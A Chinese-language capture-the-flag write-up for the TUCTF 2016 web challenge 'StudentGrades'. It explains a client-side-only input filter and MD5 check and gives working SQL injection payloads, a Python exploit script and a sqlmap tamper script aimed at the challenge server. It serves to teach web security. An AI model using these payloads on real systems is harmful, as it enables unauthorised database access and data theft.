---
layout:     post
title:      "tuctf2016-web-StudentGrades"
date:       2016-05-30 14:00
category:   writeup
tag:        [tuctf2016,sql,代码审计]
---
# 题目信息

`score: 200` `type:web,sql,代码审计` `source: tuctf2016`


[原题地址](http://104.199.151.39/index.html) &emsp;[猜解源码](https://github.com/ssst0n3/ctf-wp/tree/master/2016/tuctf/web/StudentGrades)&emsp;[题目收集](http://ctf.a306.xyz:8001/tuctf2016/StudentGrades/)

## 题目描述

We are trying to find out what our grade was, but we don't seem to be in the database...

Can you help us out?

[点击这里](http://ctf.a306.xyz:8001/tuctf2016/StudentGrades/)

打开网址，一个查询界面

![](tuctf2016-StudentGrades-1.png)

## 知识点

[Ajax](http://www.w3school.com.cn/jquery/ajax_ajax.asp)

[sql injection](https://www.youtube.com/watch?v=0tyerVP9R98&index=19&list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro)

# 题目分析

## 查看源代码

页面本身没什么特别的，查看源代码发现一段javaScript

```
<script>
document.getElementById('submit').addEventListener('click',
  function(event){
    event.preventDefault();
    var input = document.getElementById('info');
    //var query = 'SELECT * from Names where name=\'' + input.value + '\'';
    var inp_str = input.value;
    inp_str = inp_str.replace(/\W+/g, " ");
    var md5_str = hex_md5(inp_str);
    var send_str = inp_str+' '+md5_str;
    var post_data = {name: send_str, submit:1};
    $.ajax({
        type: "POST",
        url: "postQuery.php",
        data: post_data,
        success: function(data){document.getElementById('results').innerHTML=data;}
    });
  }
);
</script>
```

由源码得知，在点击submit按钮之后，我们输入的字符串通过ajax方式传递给postQuery.php,postQuery再将查询结果返回来。

## 分析源码漏洞

代码对输入字符串做了过滤

`inp_str = inp_str.replace(/\W+/g, " ");`

匹配任何非单词字符，等价于“[^A-Za-z0-9_]”，然后替换成空格。

同时，我们注意到，代码还做了如下处理

```
var md5_str = hex_md5(inp_str);
var send_str = inp_str+' '+md5_str;
```

即在字符串后附加该字符串的md5值，如果发生了字符串替换，则md5必然不同，可以认为用户输入了非法字符。

因为对字符串的过滤处理放在了前端，因此我们可以直接向postQuery.php发送我们自己定义的数据以绕过过滤

```
curl -d "name=boby c83e4046a7c5d3c4bf4c292e1e6ec681&submit=1"  http://104.199.151.39/postQuery.php
```

而如果将同样的过滤处理放在后端的话，则绕过就比较难

# Exploit1
```
# coding: utf-8
import requests, md5
m = md5.new()

query1 = "tables%' UNION SELECT database(), @@version; -- "

query2 = "tables%' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'; -- "

query3 = "tables%' union select table_name,column_name from information_schema.columns where table_schema != 'mysql' AND table_schema != 'information_schema'; -- "

query4 = "tables%' union select * from tuctf_junk; -- "

query5 = "tables%' union select * from tuctf_info; -- "

m.update(query3)

r = requests.post("http://ctf.a306.xyz:8001/tuctf2016/StudentGrades/postQuery.php", data={"name":query3+' '+m.hexdigest(),"submit":"1"})

print r.text
```

# Exploit2

addmd5.py

```
#!/usr/bin/env python

from lib.core.enums import PRIORITY
import md5

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):

    retVal = payload

    if payload:
		 m = md5.new()
		 m.update(payload)
		 retVal = payload +' '+m.hexdigest()
    return retVal
```

`sqlmap -u http://ctf.a306.xyz:8001/tuctf2016/StudentGrades/postQuery.php --schema --exclude-sysdbs --tamper addmd5.py`

# 参考文献

http://www.codehead.co.uk/tuctf2016-student-grades/
